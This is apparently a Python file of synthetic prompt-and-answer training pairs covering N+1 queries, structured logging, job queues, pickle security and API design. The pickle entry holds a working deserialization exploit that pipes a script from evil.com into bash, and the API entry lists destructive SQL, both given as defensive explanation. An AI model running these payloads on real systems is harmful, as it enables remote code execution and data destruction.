"""Phase 2: Advanced Reasoning — Mixed Subcategories (Part 20)"""

PAIRS = [
    (
        "thinking/causal-slow-api-response-n-plus-1",
        "Our API endpoint that returns a list of orders is fast with 5 orders but takes 10 seconds when a user has 200 orders. The database has proper indexes. What's wrong?",
        r'''<think>
API fast with 5 orders, slow with 200. Linear scaling with number of orders suggests the classic N+1 query problem.

**Causal chain:**
- 5 orders → fast (acceptable)
- 200 orders → 10 seconds (unacceptable)
- Scaling is roughly linear with order count
- Indexes are fine (so individual queries are fast)
- Problem: too MANY queries, not slow individual queries

**N+1 query pattern:**
1. Query 1: SELECT * FROM orders WHERE user_id = 123 → 200 orders
2. For each order: SELECT * FROM products WHERE id = order.product_id → 200 more queries
3. For each order: SELECT * FROM addresses WHERE id = order.address_id → 200 more queries
4. Total: 1 + 200 + 200 = 401 queries

Each query is fast (5ms) but 401 × 5ms = 2 seconds. Add serialization, network overhead, and JSON rendering for 200 orders with nested data → 10 seconds.

**Fix: eager loading / JOIN queries**
Load all related data in 2-3 queries instead of 401.
</think>

This is almost certainly the **N+1 query problem** — the most common performance bug in web applications.

## The Problem

```
YOUR CODE (simplified):
  orders = db.query("SELECT * FROM orders WHERE user_id = ?", user_id)
  # Query 1: get 200 orders ✓ (fast, 5ms)

  for order in orders:
      order.items = db.query("SELECT * FROM order_items WHERE order_id = ?", order.id)
      # Query 2-201: one query PER order (200 × 5ms = 1000ms)

      for item in order.items:
          item.product = db.query("SELECT * FROM products WHERE id = ?", item.product_id)
          # Query 202-601: one query PER item (400 × 5ms = 2000ms)

  Total: 1 + 200 + 400 = 601 queries
  Time: 601 × 5ms = 3 seconds JUST in database queries
  + serialization + JSON rendering = 10 seconds

WITH 5 ORDERS: 1 + 5 + 10 = 16 queries → fast
WITH 200 ORDERS: 1 + 200 + 400 = 601 queries → slow
```

## The Fix: Eager Loading

```python
# ❌ N+1: one query per order (ORM default behavior)
# Django
orders = Order.objects.filter(user_id=user_id)
for order in orders:
    print(order.items.all())  # Hidden query per order!
    for item in order.items.all():
        print(item.product.name)  # Another hidden query per item!

# ✅ FIXED: eager load related data (2-3 queries total)
# Django
orders = (Order.objects
    .filter(user_id=user_id)
    .prefetch_related('items', 'items__product'))
# Query 1: SELECT * FROM orders WHERE user_id = 123
# Query 2: SELECT * FROM order_items WHERE order_id IN (1,2,3,...200)
# Query 3: SELECT * FROM products WHERE id IN (5,8,12,...unique product IDs)
# Total: 3 queries regardless of order count

# SQLAlchemy
orders = (session.query(Order)
    .filter(Order.user_id == user_id)
    .options(
        joinedload(Order.items),
        joinedload(Order.items, OrderItem.product)
    )
    .all())
```

## How to Detect N+1 Queries

```python
# Django: django-debug-toolbar shows query count per request
# Install: pip install django-debug-toolbar

# Django: log all queries
LOGGING = {
    'loggers': {
        'django.db.backends': {
            'level': 'DEBUG',  # Shows every SQL query
        }
    }
}

# SQLAlchemy: echo queries
engine = create_engine(DATABASE_URL, echo=True)

# Quick check: if query count grows with result count, you have N+1
# 5 orders → 16 queries   (N+1 pattern: scales with data)
# 50 orders → 151 queries
# 200 orders → 601 queries
# vs
# 5 orders → 3 queries    (eager loading: constant query count)
# 50 orders → 3 queries
# 200 orders → 3 queries
```

## Raw SQL Alternative

```sql
-- Instead of 601 separate queries, use JOINs:
SELECT o.*, oi.*, p.name as product_name, p.price
FROM orders o
JOIN order_items oi ON oi.order_id = o.id
JOIN products p ON p.id = oi.product_id
WHERE o.user_id = 123;

-- One query, all data. Transform in application code.
```

The rule: **if your query count scales with your data size, you have N+1**. Fix it with eager loading (prefetch_related, joinedload, or explicit JOINs).'''
    ),
    (
        "thinking/abstraction-logging-to-observability",
        "We added logging everywhere but when things go wrong we still can't figure out what happened. We have logs but they don't help. What are we doing wrong?",
        r'''<think>
Logging that doesn't help — let me ladder from logs to observability.

**Concrete problem: logs exist but aren't useful**
Common reasons:
1. Logs aren't structured (free-form text that can't be searched/filtered)
2. No correlation between logs (can't trace a request across services)
3. Logging the wrong things (too much noise, not enough context)
4. Logs aren't centralized (scattered across servers)

**Pattern: the three pillars of observability**
- Logs: what happened (event records)
- Metrics: how much (counters, gauges, histograms)
- Traces: the journey (request path through the system)

Logs alone aren't enough because they're individual events without context. You need metrics to know WHEN something went wrong and traces to understand the FLOW.

**Principle: Observability = ability to understand internal state from external outputs**
Not just "what happened" but "why did it happen?"

**Policy: instrument by default**
Every service should emit structured logs, metrics, and traces without developers having to think about it.
</think>

You have logs but not **observability**. Logs tell you WHAT happened; observability tells you WHY.

## Level 1: Your Logs Are Probably Unstructured

```python
# ❌ USELESS LOGS: free-form text, unsearchable
logger.info("Processing order for user 42")
logger.error("Payment failed!")
logger.info("Order 789 completed in 2.3 seconds")

# When things break:
# "Which user had the payment failure?"
# "What was the order ID?"
# "What was the error message?"
# grep through 10GB of text logs... maybe find it in an hour

# ✅ STRUCTURED LOGS: searchable, filterable, aggregatable
import structlog
logger = structlog.get_logger()

logger.info("order_processing_started",
    user_id=42, order_id=789, item_count=3)

logger.error("payment_failed",
    user_id=42, order_id=789, amount=99.99,
    error="card_declined", provider="stripe",
    attempt=2, request_id="req-abc-123")

logger.info("order_completed",
    user_id=42, order_id=789, duration_ms=2300)

# Now searchable: user_id=42 AND level=error → instant results
```

## Level 2: Add Request Correlation

```python
# ❌ PROBLEM: can't trace a request across log lines
# Log line 1: "order created"   — which request?
# Log line 2: "payment started" — same request? Different one?
# Log line 3: "email sent"      — related to which order?

# ✅ SOLUTION: correlation ID (request ID) on every log line
import uuid
from contextvars import ContextVar

request_id_var = ContextVar('request_id', default=None)

@app.middleware("http")
async def add_request_id(request, call_next):
    request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
    request_id_var.set(request_id)

    structlog.contextvars.bind_contextvars(request_id=request_id)
    response = await call_next(request)
    response.headers["X-Request-ID"] = request_id
    return response

# Now EVERY log line includes request_id automatically:
# {"event": "order_created", "request_id": "req-abc-123", ...}
# {"event": "payment_started", "request_id": "req-abc-123", ...}
# {"event": "email_sent", "request_id": "req-abc-123", ...}
# Filter by request_id → see the entire request journey
```

## Level 3: The Three Pillars of Observability

```
LOGS alone answer: "What happened?"
  → "Payment failed at 14:32 for user 42"

METRICS answer: "How much? How often? Is it getting worse?"
  → "Payment failures: 5% of requests in the last hour (up from 0.1%)"
  → "P99 latency: 3.2 seconds (up from 200ms)"
  → ALERTS: "Error rate > 2% for 5 minutes → page on-call"

TRACES answer: "What was the journey? Where was the time spent?"
  → Request started → auth (2ms) → database (5ms) → payment API (3200ms!) → response
  → "The payment API is the bottleneck — it's responding in 3.2s instead of 200ms"

ALL THREE TOGETHER:
  Metric alert: "Error rate spiked to 5%"
  → Check traces: "Failed requests all spend 30s on payment API then timeout"
  → Check logs: "payment_failed error='connection_timeout' provider='stripe'"
  → Root cause: "Stripe is having an outage. Our circuit breaker should have tripped."
```

## Level 4: Observable by Default

```python
# Don't make developers add logging manually.
# Instrument AUTOMATICALLY at the framework level.

# Automatic request logging (every request, every response)
@app.middleware("http")
async def observe_request(request, call_next):
    start = time.time()
    request_id = str(uuid.uuid4())

    try:
        response = await call_next(request)
        duration = time.time() - start

        # Automatic structured log
        logger.info("http_request",
            method=request.method,
            path=request.url.path,
            status=response.status_code,
            duration_ms=round(duration * 1000),
            request_id=request_id,
        )

        # Automatic metrics
        REQUEST_DURATION.labels(
            method=request.method,
            path=request.url.path,
            status=response.status_code,
        ).observe(duration)

        return response
    except Exception as e:
        logger.error("http_error",
            method=request.method,
            path=request.url.path,
            error=str(e),
            request_id=request_id,
        )
        raise

# Automatic database query logging
# Automatic external API call logging
# Developers write business logic; observability is infrastructure
```

The ladder: scattered print statements → structured logs → correlated logs with request IDs → logs + metrics + traces → automatic instrumentation. You're at step 1; you need at least step 3.'''
    ),
    (
        "thinking/uncertainty-redis-vs-database-queues",
        "Should I use Redis or just a database table for my job queue? I've seen both approaches and I'm not sure which is better for my case (a Django app processing ~100 background tasks per hour).",
        r'''<think>
Redis vs database queue for ~100 tasks/hour in Django.

**Redis queue (Celery + Redis, RQ, etc.):**
Pros:
- Purpose-built for this (pub/sub, BLPOP, fast)
- Celery is the Django standard for background tasks
- Faster throughput (if you need it)
- Built-in retry, scheduling, priority

Cons:
- Another infrastructure dependency (Redis server)
- Redis data can be lost on restart (unless persistence configured)
- More complex setup (broker, workers, monitoring)
- Need to monitor Redis separately

**Database queue (django-db-queue, custom table):**
Pros:
- No new infrastructure (uses existing database)
- ACID guarantees (tasks survive crashes)
- Simple to implement and understand
- Easy to query/debug (just SQL)
- Full transactional consistency with other operations

Cons:
- Not as fast for high throughput
- Polling (check for new tasks periodically)
- Can add load to database
- Need to handle cleanup of completed tasks

**For 100 tasks/hour:**
That's ~1.7 tasks per minute. This is very low volume. A database queue handles this trivially. Redis would be overkill.

**Confidence: 75% database queue for this specific case**

The 25% uncertainty:
- If you already have Redis for caching → might as well use it for queues too
- If you plan to scale to 10,000+ tasks/hour soon → Redis from the start
- If you need sub-second task pickup → Redis is better (DB polls every few seconds)
- If you want Celery's feature set (periodic tasks, retries, etc.) → Redis+Celery
</think>

**75% confidence: database queue is sufficient for 100 tasks/hour.** Redis is overkill at this volume.

## The Analysis

```
YOUR VOLUME: 100 tasks/hour = ~1.7 tasks/minute

DATABASE QUEUE:
  Can handle: 1,000+ tasks/minute easily
  Your load: 1.7 tasks/minute (0.17% of capacity)
  Verdict: massive overkill in the good direction ✅

REDIS QUEUE:
  Can handle: 100,000+ tasks/minute
  Your load: 1.7 tasks/minute (0.0017% of capacity)
  Verdict: like buying a cargo ship to cross a river
```

## Database Queue Implementation (Django)

```python
# models.py — your queue IS a database table
from django.db import models
from django.utils import timezone

class Task(models.Model):
    class Status(models.TextChoices):
        PENDING = 'pending'
        PROCESSING = 'processing'
        COMPLETED = 'completed'
        FAILED = 'failed'

    task_type = models.CharField(max_length=100)
    payload = models.JSONField()
    status = models.CharField(max_length=20, choices=Status.choices, default=Status.PENDING)
    created_at = models.DateTimeField(auto_now_add=True)
    started_at = models.DateTimeField(null=True)
    completed_at = models.DateTimeField(null=True)
    error = models.TextField(blank=True)
    attempts = models.IntegerField(default=0)
    max_attempts = models.IntegerField(default=3)

    class Meta:
        indexes = [
            models.Index(fields=['status', 'created_at']),
        ]

# worker.py — simple polling worker
import time
from django.db import transaction
from django.db.models import F

TASK_HANDLERS = {
    'send_email': handle_send_email,
    'process_upload': handle_process_upload,
    'generate_report': handle_generate_report,
}

def process_next_task():
    """Atomically claim and process one task."""
    with transaction.atomic():
        task = (Task.objects
            .select_for_update(skip_locked=True)  # Prevents race conditions
            .filter(status='pending', attempts__lt=F('max_attempts'))
            .order_by('created_at')
            .first())

        if not task:
            return False

        task.status = 'processing'
        task.started_at = timezone.now()
        task.attempts += 1
        task.save()

    try:
        handler = TASK_HANDLERS[task.task_type]
        handler(task.payload)
        task.status = 'completed'
        task.completed_at = timezone.now()
    except Exception as e:
        task.status = 'failed' if task.attempts >= task.max_attempts else 'pending'
        task.error = str(e)

    task.save()
    return True

def run_worker():
    """Poll for tasks. Run as: python manage.py run_worker"""
    while True:
        if not process_next_task():
            time.sleep(5)  # Poll every 5 seconds (fine for 1.7 tasks/min)

# Enqueue a task (from your views/services):
Task.objects.create(
    task_type='send_email',
    payload={'to': 'user@example.com', 'template': 'welcome'}
)
```

## When to Upgrade to Redis

```
STAY WITH DATABASE QUEUE:
  ✓ < 1,000 tasks/hour
  ✓ Tasks can wait a few seconds to be picked up
  ✓ You want simplicity (no new infrastructure)
  ✓ ACID guarantees matter (task created in same transaction as order)
  ✓ Easy debugging (SELECT * FROM tasks WHERE status='failed')

UPGRADE TO REDIS + CELERY WHEN:
  □ > 10,000 tasks/hour (database polling becomes expensive)
  □ You need sub-second task pickup
  □ You need periodic/scheduled tasks (Celery Beat)
  □ You need complex routing (priority queues, different workers)
  □ You already run Redis for caching
  □ Multiple worker types with different concurrency needs
```

## Uncertainty Sources

```
The 25% case for Redis right now:
  - You already have Redis in your stack → marginal cost is low
  - You're about to scale to 10,000+ tasks/hour → save migration pain
  - Tasks need sub-second pickup (real-time processing)
  - You want Celery's periodic task scheduling (cron-like)

If any of these apply, Redis + Celery is a reasonable choice
even at low volume. But don't add infrastructure you don't need.
```'''
    ),
    (
        "thinking/adversarial-insecure-deserialization",
        "I'm using Python's pickle to store and load user session data from Redis. A colleague said this is dangerous. Why?",
        r'''<think>
Pickle deserialization vulnerability — this is one of the most dangerous Python security issues.

**Why pickle is dangerous:**
`pickle.loads()` executes arbitrary Python code during deserialization. If an attacker can control what gets unpickled, they can execute ANY code on your server.

**The attack:**
1. Attacker finds a way to put crafted data in Redis (or intercepts the data)
2. Your app calls `pickle.loads(redis_data)`
3. The crafted pickle payload executes `os.system("rm -rf /")` or reverse shell
4. Game over — full remote code execution

**How easy is the exploit?**
Trivially easy. A malicious pickle payload that runs arbitrary commands is ~5 lines of Python.

**Why the colleague is right:**
- Pickle should NEVER be used with untrusted data
- Session data in Redis could be tampered with if Redis is compromised
- Or if there's any way to write to those Redis keys (SSRF, Redis exposure, etc.)

**Safe alternatives:**
- JSON (can't execute code)
- MessagePack (can't execute code)
- Django's signed session serializer (JSON + HMAC)
</think>

Your colleague is absolutely right. **Pickle can execute arbitrary code during deserialization.** If an attacker can control what gets unpickled, they own your server.

## The Attack

```python
# WHAT YOUR CODE DOES:
import pickle
import redis

r = redis.Redis()

def save_session(session_id, data):
    r.set(f"session:{session_id}", pickle.dumps(data))

def load_session(session_id):
    raw = r.get(f"session:{session_id}")
    return pickle.loads(raw)  # ← EXECUTES ARBITRARY CODE

# WHAT AN ATTACKER DOES:
import pickle
import os

class Exploit:
    def __reduce__(self):
        # __reduce__ tells pickle HOW to reconstruct the object
        # pickle.loads() will EXECUTE this code:
        return (os.system, ("curl https://evil.com/shell.sh | bash",))

# Craft the malicious payload
payload = pickle.dumps(Exploit())

# If attacker can write to Redis (exposed Redis, SSRF, compromised app):
r.set("session:target-user", payload)

# When your app loads this session:
# pickle.loads(payload)
# → os.system("curl https://evil.com/shell.sh | bash")
# → Reverse shell → attacker has full access to your server
```

## How an Attacker Gets Malicious Data Into Redis

```
ATTACK VECTORS:

1. EXPOSED REDIS (most common)
   Redis default: no authentication, binds to 0.0.0.0
   Attacker connects directly: redis-cli -h your-server.com
   → Writes malicious pickle to any key

2. SSRF (Server-Side Request Forgery)
   Your app has an endpoint that fetches URLs:
   fetch("http://localhost:6379/SET/session:admin/[pickle-payload]")
   → Redis protocol is text-based, can be exploited via HTTP

3. COMPROMISED ADJACENT SERVICE
   Another service sharing the same Redis instance
   If that service is compromised → can write to session keys

4. SESSION FIXATION
   If session ID is predictable or controllable
   Attacker creates a session with malicious data
   → Victim loads that session
```

## The Fix: Never Use Pickle for Untrusted Data

```python
import json
import redis

r = redis.Redis()

# ✅ SAFE: use JSON (cannot execute code)
def save_session(session_id, data):
    r.set(f"session:{session_id}", json.dumps(data))

def load_session(session_id):
    raw = r.get(f"session:{session_id}")
    if raw is None:
        return None
    return json.loads(raw)  # ← Can only parse data, never execute code

# JSON limitation: only supports basic types (str, int, list, dict, bool, None)
# For datetime, custom objects, etc., serialize to string first:
data = {
    "user_id": 42,
    "created_at": datetime.now().isoformat(),  # String, not datetime object
    "roles": ["admin", "user"],
}
```

```python
# Django sessions: use JSON serializer (not pickle)
# settings.py
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.JSONSerializer'
# NOT: 'django.contrib.sessions.serializers.PickleSerializer'  ← dangerous
```

## When Is Pickle Safe?

```
PICKLE IS SAFE ONLY WHEN:
  □ YOU control the data source completely
  □ Data never passes through untrusted channels
  □ No external system can modify the pickled data
  □ Example: caching YOUR OWN computed results locally

PICKLE IS DANGEROUS WHEN:
  ✗ Data comes from users (sessions, uploads, API inputs)
  ✗ Data passes through a shared store (Redis, database, S3)
  ✗ Data crosses a network boundary
  ✗ Data could be tampered with by any external party

SAFE ALTERNATIVES:
  JSON:        json.loads()       — basic types, universal
  MessagePack: msgpack.unpackb()  — compact binary, fast
  Protocol Buffers: msg.ParseFromString()  — typed, schema-enforced
  HMAC+JSON:   verify signature, then json.loads()  — tamper-proof
```

Rule: treat `pickle.loads()` like `eval()` — it runs arbitrary code. Never use it on data you don't 100% control.'''
    ),
    (
        "thinking/firstprinciples-why-apis-exist",
        "Why do we need APIs? Why can't my frontend just connect directly to the database?",
        r'''<think>
Why APIs exist, from first principles. Why not connect frontend directly to database?

**What happens if the frontend connects directly to the database:**

1. **Security: total database exposure**
   - Frontend code runs in the user's browser
   - Browser code is fully inspectable (View Source, DevTools)
   - Database credentials would be in the JavaScript → anyone can see them
   - Anyone with credentials has FULL database access (read/write/delete everything)

2. **No business logic enforcement**
   - Who validates that a user can only see their own data?
   - Who checks that an order total is correct?
   - Who prevents someone from setting their account balance to $1,000,000?
   - The database doesn't know your business rules

3. **Tight coupling**
   - Frontend is coupled to database schema
   - Can't change database structure without breaking frontend
   - Can't add a mobile app without duplicating all the logic
   - Can't change databases (Postgres → MongoDB) without rewriting frontend

4. **No rate limiting, caching, or monitoring**
   - Can't limit how many requests a user makes
   - Can't cache common queries
   - Can't log who accessed what

The API is the BOUNDARY between untrusted clients and trusted data. It enforces rules, controls access, and abstracts the implementation.
</think>

Because your frontend runs in the **user's browser**, and the user's browser is **hostile territory**.

## From First Principles

```
YOUR FRONTEND CODE:
  Runs in the user's browser
  → User can view ALL code (View Source, DevTools)
  → User can modify ALL code (console, extensions)
  → User can intercept ALL network requests
  → User can replay, modify, or forge requests

IF FRONTEND CONNECTS DIRECTLY TO DATABASE:
  Database credentials must be in the JavaScript
  → User opens DevTools → Network tab → sees credentials
  → User connects directly: psql -h your-server -U admin -p secretpassword
  → SELECT * FROM users  (sees everyone's data)
  → UPDATE users SET role = 'admin' WHERE id = my_id  (makes themselves admin)
  → DELETE FROM orders  (deletes everything)
  → DROP TABLE users  (destroys your database)
  → Game over.
```

## What an API Provides

```
WITHOUT API (frontend → database):
  Browser: "SELECT * FROM users WHERE id = 42"
  Database: here's user 42... and anyone can ask for any user

WITH API (frontend → API → database):
  Browser: "GET /api/users/me" (with auth token)
  API:
    1. AUTHENTICATE: "Is this token valid? → Yes, this is user 42"
    2. AUTHORIZE: "Can user 42 access this endpoint? → Yes"
    3. VALIDATE: "Is the request well-formed? → Yes"
    4. BUSINESS LOGIC: "Get user 42's data (only THEIR data)"
    5. FILTER: "Remove sensitive fields (password_hash, ssn)"
    6. RESPOND: {name: "Dan", email: "dan@..."} (safe subset)
```

## The Four Things an API Enforces

```python
# 1. AUTHENTICATION — who are you?
@app.get("/api/orders")
async def get_orders(current_user = Depends(get_current_user)):
    # Without API: browser sends raw SQL, no identity verification
    # With API: every request must prove identity

# 2. AUTHORIZATION — what are you allowed to do?
    orders = await Order.filter(user_id=current_user.id)
    # User 42 can ONLY see user 42's orders
    # Without API: SELECT * FROM orders → sees ALL orders

# 3. VALIDATION — is this request valid?
@app.post("/api/orders")
async def create_order(data: OrderRequest):  # Pydantic validates input
    if data.quantity < 1:
        raise ValueError("Quantity must be positive")
    if data.total != calculate_total(data.items):
        raise ValueError("Total doesn't match items")
    # Without API: INSERT INTO orders (total) VALUES (-1000)
    # → user gives themselves a $1000 credit

# 4. ABSTRACTION — hide implementation details
    # Frontend doesn't know:
    # - Which database (Postgres? MongoDB? Both?)
    # - What the schema looks like (can change without breaking frontend)
    # - How data is processed (caching, queuing, third-party calls)
    # - What other systems are involved (payment, shipping, email)
    return {"order_id": order.id, "status": "created"}
```

## Why It Matters for Multiple Clients

```
WITHOUT API:
  Web frontend ──→ database (SQL logic in JavaScript)
  Mobile app ───→ database (same SQL logic duplicated in Swift/Kotlin)
  Admin panel ──→ database (SQL logic duplicated again)
  Partner API ──→ database (SQL logic duplicated AGAIN)

  Bug in business logic? Fix it in 4 places. Miss one? Inconsistent data.

WITH API:
  Web frontend ──→ API ──→ database
  Mobile app ───→ API ──→ database
  Admin panel ──→ API ──→ database
  Partner API ──→ API ──→ database

  Business logic in ONE place. Fix once, works everywhere.
```

**The API is the bouncer at the door.** Without it, anyone with a browser can walk into your database and do whatever they want.'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
